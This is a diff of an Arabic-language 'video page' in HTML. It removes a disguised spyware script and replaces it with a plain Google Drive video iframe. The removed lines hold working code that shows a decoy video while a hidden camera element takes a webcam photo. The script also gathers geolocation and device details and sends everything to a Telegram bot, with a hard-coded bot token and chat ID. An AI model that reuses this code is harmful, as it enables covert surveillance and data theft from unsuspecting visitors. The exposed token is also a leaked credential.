@@ -2,147 +2,30 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>One gg 0 Video</title>
-
+<title>Video Page</title>
 <style>
-body {
-  margin: 0;
+body{
+  margin:0;
   background:#000;
-  color:#0f0;
-  font-family: Arial;
-  text-align: center;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  height:100vh;
 }
-
-/* إخفاء معاينة الكاميرا */
-video#camera {
-  display: none;
-}
-
-/* فيديو في منتصف الصفحة */
-.video-center {
-  position: fixed;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  z-index: 5;
-}
-
-.video-center video {
-  width: 320px;
-  max-width: 90vw;
-  border-radius: 14px;
-  box-shadow: 0 0 25px rgba(0,0,0,0.7);
+iframe{
+  width:320px;
+  height:180px;
+  border:0;
+  border-radius:12px;
 }
 </style>
 </head>
-
 <body>
 
-<h3>جاري التحميل...</h3>
-
-<!-- فيديو الواجهة -->
-<div class="video-center">
-  <video autoplay muted loop playsinline>
-    <source src="video.mp4" type="video/mp4">
-    متصفحك لا يدعم الفيديو
-  </video>
-</div>
-
-<!-- كاميرا مخفية -->
-<video id="camera" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;"></canvas>
-
-<script>
-// ===== ضع معلوماتك هنا (محليًا فقط) =====
-const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
-const CHAT_ID  = "‏6251932709";
-// ======================================
-
-let streamRef = null;
-let locationInfo = "📍 الموقع: غير متاح";
-
-// -------- الموقع (بموافقة المستخدم) --------
-if (navigator.geolocation) {
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      locationInfo = `
-📍 الموقع:
-- Latitude: ${pos.coords.latitude}
-- Longitude: ${pos.coords.longitude}
-- الدقة: ${pos.coords.accuracy} م
-      `;
-    },
-    () => {
-      locationInfo = "📍 الموقع: تم رفض الإذن";
-    }
-  );
-}
-
-// -------- معلومات الجهاز --------
-function getDeviceInfo() {
-  const ua = navigator.userAgent;
-  let device = "غير معروف";
-
-  if (/android/i.test(ua)) device = "Android";
-  else if (/iphone|ipad|ipod/i.test(ua)) device = "iPhone / iOS";
-  else if (/windows/i.test(ua)) device = "Windows";
-  else if (/macintosh/i.test(ua)) device = "Mac";
-  else if (/linux/i.test(ua)) device = "Linux";
-
-  return `
-📱 الجهاز: ${device}
-🌐 المتصفح: ${navigator.appName}
-📐 الشاشة: ${screen.width} x ${screen.height}
-⏰ الوقت: ${new Date().toLocaleString()}
-${locationInfo}
-  `;
-}
-
-// -------- تشغيل الكاميرا --------
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => {
-  streamRef = stream;
-  document.getElementById("camera").srcObject = stream;
-
-  // صورة واحدة فقط بعد ثانيتين
-  setTimeout(captureOnce, 2000);
-})
-.catch(() => {
-  document.body.innerHTML = "<h2>تم رفض إذن الكاميرا</h2>";
-});
-
-function captureOnce() {
-  const video = document.getElementById("camera");
-  const canvas = document.getElementById("canvas");
-
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext("2d").drawImage(video, 0, 0);
-
-  // إيقاف الكاميرا
-  if (streamRef) {
-    streamRef.getTracks().forEach(t => t.stop());
-  }
-
-  canvas.toBlob(blob => {
-    const form = new FormData();
-    form.append("chat_id", CHAT_ID);
-    form.append("photo", blob);
-    form.append("caption", getDeviceInfo());
-
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method: "POST",
-      body: form
-    })
-    .then(() => {
-      document.querySelector("h3").innerText = "تم الإرسال ✅";
-    })
-    .catch(() => {
-      document.querySelector("h3").innerText = "فشل الإرسال ❌";
-    });
-  }, "image/jpeg");
-}
-</script>
+<iframe
+  src="https://drive.google.com/file/d/1Jm7M5DYG87xUy3kdU6VJ032E8t8KHp4Z/preview"
+  allow="autoplay; fullscreen">
+</iframe>
 
 </body>
 </html>
